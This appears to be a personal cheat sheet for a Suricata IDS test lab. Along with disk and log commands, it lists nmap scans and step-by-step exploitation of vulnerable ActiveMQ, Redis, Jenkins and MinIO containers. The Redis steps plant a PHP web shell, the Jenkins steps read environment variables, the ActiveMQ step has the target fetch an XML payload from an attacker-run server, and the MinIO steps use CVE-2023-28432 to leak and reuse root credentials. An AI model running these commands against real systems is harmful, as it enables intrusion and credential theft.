# Help

### disk
```bash
df -h
lsblk
sudo pvresize /dev/sda3
sudo lvextend -l +100%FREE /dev/mapper/ubuntu--vg-ubuntu--lv
sudo resize2fs /dev/mapper/ubuntu--vg-ubuntu--lv
sudo cfdisk /dev/sda
```

### Проверить iptables:
```bash
sudo iptables -L DOCKER-USER -nv --line-numbers
```

### Проверить Логи Suricata:
```bash
journalctl -u suricata.service -b
sudo tail -n 200 /var/log/suricata/suricata.log
sudo tail -n 0 -f /var/log/suricata/fast.log
sudo tail -n 0 -f /var/log/suricata/eve.json | jq .
```

### Запустить Suricata вручную:
```bash
sudo suricata -c /etc/suricata/suricata.yaml -q 0
```

### NMAP scans:
```bash
nmap -sS victim     # SYN scan
nmap -sX victim     # Xmas scan
nmap -sU victim     # UDP scan
nmap -O victim      # OS detection
```

### ActiveMQ
```bash
nmap -sV -p 61616,8161 172.20.0.101
curl -I http://172.20.0.101:8161/
cd /opt
python3 -m http.server 8888
python3 poc.py -i 172.20.0.101 -p 61616 -u http://172.20.0.10:8888/poc.xml
```

### Redis Unauthorized Access + Command Execution
```bash
nmap -sV -p 6379 172.20.0.102
redis-cli -h 172.20.0.102 ping
redis-cli -h 172.20.0.102
>>> info server
>>> config get "*"
>>> keys *
>>> dbsize
>>> config set dir /tmp
>>> config set dbfilename webshell.php
>>> set test "<?php system($_GET['cmd']); ?>"
>>> save
# check /tmp/webshell.php on the target
```

### Jenkins
```bash
nmap -sV -p 8080,50000,5005 172.20.0.105
cd /tmp
wget http://172.20.0.105:8080/jnlpJars/jenkins-cli.jar
file jenkins-cli.jar
java -jar jenkins-cli.jar -s http://172.20.0.105:8080/ -http help "@/proc/self/environ"
```

### Minio
```bash
nmap -sV -p 9000,9001 172.20.0.103
curl -I http://172.20.0.103:9000/
curl -I http://172.20.0.103:9001/
curl -X POST http://172.20.0.103:9000/minio/bootstrap/v1/verify \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "" | jq '.MinioEnv.MINIO_ROOT_USER, .MinioEnv.MINIO_ROOT_PASSWORD'
```

```bash
aws configure set aws_access_key_id minioadmin
aws configure set aws_secret_access_key minioadmin-vulhub
aws configure set region us-east-1
aws --endpoint-url http://172.20.0.103:9000 s3 mb s3://cve-2023-28432-pwned make_bucket: cve-2023-28432-pwned
echo "MinIO Cluster compromised via CVE-2023-28432!" > cve_exploit_proof.txt
echo "Stolen credentials: minioadmin:minioadmin-vulhub" >> cve_exploit_proof.txt
aws --endpoint-url http://172.20.0.103:9000 s3 cp cve_exploit_proof.txt s3://cve-2023-28432-pwned/
aws --endpoint-url http://172.20.0.103:9000 s3 ls s3://cve-2023-28432-pwned/
```